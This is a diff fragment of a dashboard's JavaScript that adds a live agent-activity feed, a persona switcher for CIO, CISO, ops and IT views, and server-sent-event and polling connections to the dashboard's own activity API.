+  const all = S.activities && S.activities.length ? S.activities : [];
+  
+  let filtered = all;
+  if (sel !== 'Enterprise Root') {
+    filtered = all.filter(a => {
+      const s = ((a.business_unit||'') + ' ' + (a.agent_type||'') + ' ' + (a.intent_category||'') + ' ' + (a.application||'')).toLowerCase();
+      return s.includes(sel.toLowerCase());
+    });
+  }
+  
+  if (!filtered.length && all.length) {
+    filtered = all.slice(0, 5);
+  }
+
+  el.innerHTML = filtered.length ? filtered.map(act => {
+    return `
+    <div class="act-card">
+      <div class="act-meta">
+        <div>
+          <b>${esc(act.business_unit || 'Enterprise Unit')}</b>
+          <span style="color:var(--muted);margin-left:6px">&bull; ${esc(act.agent_type || 'agent')}</span>
+        </div>
+        <span class="mono" style="color:var(--muted)">${timeAgo(act.timestamp)}</span>
+      </div>
+      <div class="act-summary">${esc(act.prompt_summary || act.action || 'Workload action')}</div>
+      <div class="act-footer">
+        <div><span class="tag t-LIVE"><span class="dot-live"></span>${esc(act.action_status || 'working')}</span></div>
+        <span class="mono" style="font-size:12px;color:var(--muted)">Trace: ${esc(act.trace_id || 'tr-live')}</span>
+      </div>
+    </div>`;
+  }).join('') : `<div class="empty">No active sessions found for ${esc(sel)}.</div>`;
+}
+
+function updatePersonaUI() {
+  const seg = $('#personaSeg');
+  if (seg) {
+    [...seg.children].forEach(btn => {
+      btn.setAttribute('aria-pressed', btn.dataset.p === S.persona);
+    });
+  }
+}
+
+function setPersona(p) {
+  if (!['cio', 'ciso', 'ops', 'it'].includes(p)) return;
+  S.persona = p;
+  try { localStorage.setItem('bap_persona', p); } catch(e){}
+  const u = new URL(window.location);
+  u.searchParams.set('persona', p);
+  window.history.replaceState({}, '', u);
+  updatePersonaUI();
+  
+  // Navigate to appropriate default view for persona
+  if (p === 'cio') {
+    go('pulse');
+  } else if (p === 'ciso') {
+    go('overview');
+  } else if (p === 'ops') {
+    go('overview');
+  } else if (p === 'it') {
+    go('endpoint');
+  }
+}
+
+/* ---------- SSE Stream Connection ---------- */
+function initActivityStream() {
+  if (S.eventSource) {
+    try { S.eventSource.close(); } catch(e){}
+  }
+  try {
+    const es = new EventSource(S.api.base + '/api/activity/stream');
+    S.eventSource = es;
+    es.addEventListener('snapshot', e => {
+      try {
+        const events = JSON.parse(e.data);
+        if (Array.isArray(events)) {
+          S.activities = events;
+          if (S.view === 'pulse') renderPulseFeed();
+          if (S.view === 'map') renderTopoFilteredFeed();
+        }
+      } catch(err){}
+    });
+    es.addEventListener('activity', e => {
+      try {
+        const ev = JSON.parse(e.data);
+        if (ev) {
+          S.activities.unshift(ev);
+          if (S.activities.length > 200) S.activities.pop();
+          if (S.view === 'pulse') renderPulseFeed();
+          if (S.view === 'map') renderTopoFilteredFeed();
+        }
+      } catch(err){}
+    });
+    es.onerror = () => {
+      // Stream error: fallback handles telemetry via polling
+    };
+  } catch(e) {
+    console.warn('Activity SSE stream unavailable; polling fallback active', e);
+  }
+}
+
+async function fetchActivityData() {
+  try {
+    const [resSum, resLive] = await Promise.all([
+      fetch(S.api.base + '/api/activity/summary', { headers: getHeaders() }),
+      fetch(S.api.base + '/api/activity/live', { headers: getHeaders() })
+    ]);
+    if (resSum.ok) {
+      S.actSummary = await resSum.json();
+      const totEl = $('#pulseTotal');
+      if (totEl && S.actSummary.active_agents) {
+        totEl.textContent = S.actSummary.active_agents.toLocaleString();
+      }
+    }
+    if (resLive.ok) {
+      const liveData = await resLive.json();
+      if (liveData && Array.isArray(liveData.activities)) {
+        S.activities = liveData.activities;
+        if (S.view === 'pulse') renderPulseFeed();
+        if (S.view === 'map') renderTopoFilteredFeed();
+      }
+    }
+  } catch(e){}
+}
+
 /* ---------- live polling loop ---------- */
 setInterval(()=>{
   S.grants.forEach(g=>{if(g.ttl>0)g.ttl--});
@@ -948,7 +1634,10 @@ setInterval(()=>{
 
 // Poll live control plane every 3.5s
 setInterval(()=>{
-  if(!S.paused) fetchTelemetry();
+  if(!S.paused) {
+    fetchTelemetry();
+    fetchActivityData();
+  }
 },3500);
 
 /* ---------- boot ---------- */
@@ -957,11 +1646,45 @@ setInterval(()=>{
     const savedToken = sessionStorage.getItem('bap_admin_token');
     if(savedToken) S.api.token = savedToken;
   } catch(e){}
+
+  // Check URL param or localStorage for persona
+  const urlParams = new URLSearchParams(window.location.search);
+  const pParam = urlParams.get('persona');
+  if (pParam && ['cio','ciso','ops','it'].includes(pParam.toLowerCase())) {
+    S.persona = pParam.toLowerCase();
+  } else {
+    try {
+      const saved = localStorage.getItem('bap_persona');
+      if (saved && ['cio','ciso','ops','it'].includes(saved)) {
+        S.persona = saved;
+      }
+    } catch(e){}
+  }
+  updatePersonaUI();
+
+  // Wire persona switcher header buttons
+  const pSeg = $('#personaSeg');
+  if (pSeg) {
+    pSeg.onclick = e => {
+      const btn = e.target.closest('button[data-p]');
+      if (btn && btn.dataset.p) {
+        setPersona(btn.dataset.p);
+      }
+    };
+  }
+
   seedFallback();
   await buildChain();
   connUI();
-  go('overview');
+
+  // Landing view according to persona
+  if (S.persona === 'cio') go('pulse');
+  else if (S.persona === 'it') go('endpoint');
+  else go('overview');
+
   await fetchTelemetry();
+  await fetchActivityData();
+  initActivityStream();
 })();
 </script>
 </body>
